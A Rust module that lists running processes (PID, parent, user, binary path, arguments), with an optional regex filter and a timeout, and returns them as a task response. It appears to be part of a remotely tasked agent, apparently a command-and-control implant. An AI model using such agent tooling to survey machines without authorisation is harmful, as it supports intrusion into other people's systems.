use crate::structs::{ProcessDetails, Task};
use crate::utils;
use serde::Deserialize;
use std::collections::HashMap;
use sysinfo::{ProcessRefreshKind, RefreshKind, System};

#[derive(Deserialize)]
struct PsArgs {
    #[serde(default)]
    regex_filter: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: PsArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => {
            // If params is a non-empty non-JSON string, treat it as a regex filter
            let p = task.data.params.trim().to_string();
            PsArgs {
                regex_filter: if p == "{}" || p.is_empty() { String::new() } else { p },
            }
        }
    };

    utils::print_debug(&format!(
        "ps: executing with regex_filter='{}'",
        args.regex_filter
    ));

    // Run sysinfo in a blocking thread with a timeout
    let regex_filter = args.regex_filter.clone();
    let blocking_handle = tokio::task::spawn_blocking(move || {
        utils::print_debug("ps: spawn_blocking started, creating System");
        collect_processes(&regex_filter)
    });

    // 30-second timeout to prevent infinite hangs
    let result = tokio::time::timeout(std::time::Duration::from_secs(30), blocking_handle).await;

    match result {
        Ok(Ok(processes)) => {
            utils::print_debug(&format!("ps: collected {} processes", processes.len()));
            response.user_output = format!("Collected {} processes", processes.len());
            response.processes = Some(processes);
            response.completed = true;
        }
        Ok(Err(e)) => {
            utils::print_debug(&format!("ps: spawn_blocking panicked: {:?}", e));
            response.set_error(&format!("Failed to collect processes: {:?}", e));
        }
        Err(_) => {
            utils::print_debug("ps: timed out after 30 seconds");
            response.set_error("Process listing timed out after 30 seconds");
        }
    }

    utils::print_debug("ps: sending response");
    let _ = task.job.send_responses.send(response).await;
    utils::print_debug("ps: response sent, removing task");
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
    utils::print_debug("ps: done");
}

fn collect_processes(regex_filter: &str) -> Vec<ProcessDetails> {
    // Only refresh process info — NOT cpu, memory, disks, networks, or components
    // (System::new_all() refreshes everything including IOKit temperature sensors
    // which can hang on macOS)
    let sys = System::new_with_specifics(
        RefreshKind::new().with_processes(ProcessRefreshKind::everything()),
    );
    utils::print_debug(&format!("ps: System created, {} processes", sys.processes().len()));

    let re = if !regex_filter.is_empty() {
        regex::Regex::new(regex_filter).ok()
    } else {
        None
    };

    let mut processes = Vec::new();
    for (pid, process) in sys.processes() {
        let name = process.name().to_string_lossy().to_string();

        if let Some(ref re) = re {
            if !re.is_match(&name) {
                continue;
            }
        }

        let ppid = process.parent().map(|p| p.as_u32() as i32).unwrap_or(0);
        let user = process
            .user_id()
            .and_then(|uid| {
                nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(**uid))
                    .ok()
                    .flatten()
            })
            .map(|u| u.name)
            .unwrap_or_default();

        let bin_path = process
            .exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();

        processes.push(ProcessDetails {
            process_id: pid.as_u32() as i32,
            parent_process_id: ppid,
            arch: std::env::consts::ARCH.to_string(),
            user,
            bin_path,
            arguments: process
                .cmd()
                .iter()
                .map(|s| s.to_string_lossy().to_string())
                .collect(),
            environment: HashMap::new(),
            sandbox_path: String::new(),
            scripting_properties: HashMap::new(),
            name,
            bundle_id: String::new(),
            update_deleted: true,
            additional_information: HashMap::new(),
        });
    }
    utils::print_debug(&format!("ps: built {} ProcessDetails", processes.len()));
    processes
}
